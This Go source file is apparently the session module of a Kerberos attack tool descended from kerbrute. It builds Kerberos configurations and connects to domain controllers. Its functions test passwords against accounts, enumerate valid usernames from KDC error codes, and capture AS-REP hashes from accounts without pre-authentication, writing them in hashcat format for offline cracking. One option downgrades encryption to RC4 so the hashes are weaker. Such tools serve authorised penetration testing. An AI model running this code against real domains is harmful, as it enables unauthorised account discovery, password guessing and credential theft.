package session

import (
	"fmt"
	"github.com/abdelaaziz0/kerbrutal/util"
	"text/template"
	"os"
	"strings"

	"github.com/ropnop/gokrb5/v8/iana/errorcode"

	kclient "github.com/ropnop/gokrb5/v8/client"
	kconfig "github.com/ropnop/gokrb5/v8/config"
	"github.com/ropnop/gokrb5/v8/messages"
)

const krb5ConfigTemplateDNS = `[libdefaults]
dns_lookup_kdc = true
default_realm = {{.Realm}}
`

const krb5ConfigTemplateKDC = `[libdefaults]
default_realm = {{.Realm}}
[realms]
{{.Realm}} = {
{{range .DomainControllers}}	kdc = {{.}}
{{end}}	admin_server = {{index .DomainControllers 0}}
}
`

type KerbruteSession struct {
	Domain       string
	Realm        string
	Kdcs         map[int]string
	ConfigString string
	Config       *kconfig.Config
	Verbose      bool
	SafeMode     bool
	HashFile     *os.File
	Logger       *util.Logger
	Dialer       kclient.Dialer
}

type KerbruteSessionOptions struct {
	Domain           string
	DomainController string
	Verbose          bool
	SafeMode         bool
	Downgrade        bool
	HashFilename     string
	logger           *util.Logger
	Dialer           kclient.Dialer
}

func NewKerbruteSession(options KerbruteSessionOptions) (k KerbruteSession, err error) {
	if options.Domain == "" {
		return k, fmt.Errorf("domain must not be empty")
	}
	if options.logger == nil {
		logger := util.NewLogger(options.Verbose, "", false)
		options.logger = &logger
	}
	var hashFile *os.File
	if options.HashFilename != "" {
		hashFile, err = os.OpenFile(options.HashFilename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			return k, err
		}
		options.logger.Log.Infof("Saving any captured hashes to %s", hashFile.Name())
		if !options.Downgrade {
			options.logger.Log.Warningf("You are capturing AS-REPs, but not downgrading encryption. You probably want to downgrade to arcfour-hmac-md5 (--downgrade) to crack them with a user's password instead of AES keys")
		}
	}

	realm := strings.ToUpper(options.Domain)

	var dcs []string
	if options.DomainController != "" {
		for _, dc := range strings.Split(options.DomainController, ",") {
			dc = strings.TrimSpace(dc)
			if dc != "" {
				dcs = append(dcs, dc)
			}
		}
	}

	configstring := buildKrb5Template(realm, dcs)
	Config, err := kconfig.NewFromString(configstring)
	if err != nil {
		return k, fmt.Errorf("could not parse Kerberos config: %v", err)
	}
	if options.Downgrade {
		Config.LibDefaults.DefaultTktEnctypeIDs = []int32{23}
		options.logger.Log.Info("Using downgraded encryption: arcfour-hmac-md5")
	}
	_, kdcs, err := Config.GetKDCs(realm, false)
	if err != nil {
		err = fmt.Errorf("Couldn't find any KDCs for realm %s. Please specify a Domain Controller", realm)
	}
	k = KerbruteSession{
		Domain:       options.Domain,
		Realm:        realm,
		Kdcs:         kdcs,
		ConfigString: configstring,
		Config:       Config,
		Verbose:      options.Verbose,
		SafeMode:     options.SafeMode,
		HashFile:     hashFile,
		Logger:       options.logger,
		Dialer:       options.Dialer,
	}
	return k, err

}

func buildKrb5Template(realm string, domainControllers []string) string {
	var kTemplate string
	if len(domainControllers) == 0 {
		kTemplate = krb5ConfigTemplateDNS
		data := map[string]interface{}{
			"Realm": realm,
		}
		t := template.Must(template.New("krb5ConfigString").Parse(kTemplate))
		builder := &strings.Builder{}
		if err := t.Execute(builder, data); err != nil {
			panic(err)
		}
		return builder.String()
	}

	kTemplate = krb5ConfigTemplateKDC
	data := map[string]interface{}{
		"Realm":             realm,
		"DomainControllers": domainControllers,
	}
	t := template.Must(template.New("krb5ConfigString").Parse(kTemplate))
	builder := &strings.Builder{}
	if err := t.Execute(builder, data); err != nil {
		panic(err)
	}
	return builder.String()
}

func (k KerbruteSession) TestLogin(username, password string) (bool, error) {
	Client := kclient.NewWithPassword(username, k.Realm, password, k.Config, kclient.DisablePAFXFAST(true), kclient.WithDialer(k.Dialer))
	defer Client.Destroy()
	if ok, err := Client.IsConfigured(); !ok {
		return false, err
	}
	err := Client.Login()
	if err == nil {
		return true, err
	}
	success, err := k.TestLoginError(err)
	return success, err
}

func (k KerbruteSession) TestUsername(username string) (bool, string, int32, error) {
	cl := kclient.NewWithPassword(username, k.Realm, "foobar", k.Config, kclient.DisablePAFXFAST(true), kclient.WithDialer(k.Dialer))

	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		return false, "", 0, fmt.Errorf("error creating AS-REQ: %v", err)
	}
	b, err := req.Marshal()
	if err != nil {
		return false, "", 0, err
	}
	rb, err := cl.SendToKDC(b, k.Realm)

	if err == nil {
		var ASRep messages.ASRep
		err = ASRep.Unmarshal(rb)
		if err != nil {
			return false, "", 0, err
		}
		hash := k.DumpASRepHash(ASRep)
		return true, hash, ASRep.EncPart.EType, nil
	}
	e, ok := err.(messages.KRBError)
	if !ok {
		return false, "", 0, err
	}
	switch e.ErrorCode {
	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
		return true, "", 0, nil
	default:
		return false, "", 0, err

	}
}

func (k KerbruteSession) DumpASRepHash(asrep messages.ASRep) string {
	hash, err := util.ASRepToHashcat(asrep)
	if err != nil {
		k.Logger.Log.Debugf("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", asrep.CName.PrincipalNameString(), err.Error())
		return ""
	}
	k.Logger.Log.Noticef("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", asrep.CName.PrincipalNameString(), hash)
	if k.HashFile != nil {
		_, err := k.HashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			k.Logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
	}
	return hash
}
